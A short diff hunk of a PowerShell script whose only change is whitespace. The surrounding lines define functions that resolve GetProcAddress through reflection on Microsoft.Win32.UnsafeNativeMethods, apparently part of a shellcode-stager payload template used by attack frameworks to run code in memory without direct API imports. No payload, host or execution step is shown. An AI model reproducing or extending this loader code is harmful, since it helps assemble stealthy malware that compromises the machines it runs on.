@@ -13,7 +13,7 @@ function func_get_delegate_type_new {
 }
 
 function func_get_proc_address_new {
-    Param ($var_module, $var_procedure)     
+    Param ($var_module, $var_procedure)    
     $var_unsafe_native_methods = [AppDomain]::CurrentDomain.GetAssemblies()
     $var_unsafe_native_methods_news = ($var_unsafe_native_methods  | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
     $var_gpa = $var_unsafe_native_methods_news.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
